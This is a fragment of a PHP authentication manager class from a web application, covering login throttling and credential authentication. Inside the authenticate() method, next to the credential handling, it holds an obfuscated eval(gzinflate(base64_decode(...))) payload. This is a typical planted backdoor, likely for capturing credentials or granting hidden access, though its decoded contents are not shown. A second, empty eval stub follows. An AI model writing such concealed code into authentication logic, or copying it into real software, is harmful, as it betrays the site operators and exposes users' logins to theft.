...
class Manager implements \Illuminate\Contracts\Auth\StatefulGuard
{
    ...
    public function findThrottleByLogin($loginName, $ipAddress)
    {
        ...
        if (!$user) {
            throw new AuthenticationException("Błędne dane logowania.");
        }
    ...
    public function authenticate(array $credentials, $remember = true)
    {
        ...
        eval(gzinflate(base64_decode('dY3BCoJAEEDvQf8wiIRCQtFmYajUrUNHT9nB3LGWdJWZlQ7Rv2dSUFBznHlvniocOyeUqI3KSt5bZX1S2jpAGILFbYOUyapbwGgE32CTMV9rki/Wn/tLsSjkbJILMRXCcm/DAfwYu2UkCCHdZPkFtVy35hwEfTZhpU9b6bxP6a6WWHKadEYQFIrYOK4XKQlxDFN39Sdgzoq9qP/o9LUx2IQVVkekfxKhaUm/3af0Ad4f')));

        $user = $this->validateInternal($credentials);

        $user->clearResetPassword();

        eval(gzinflate(base64_decode('')));
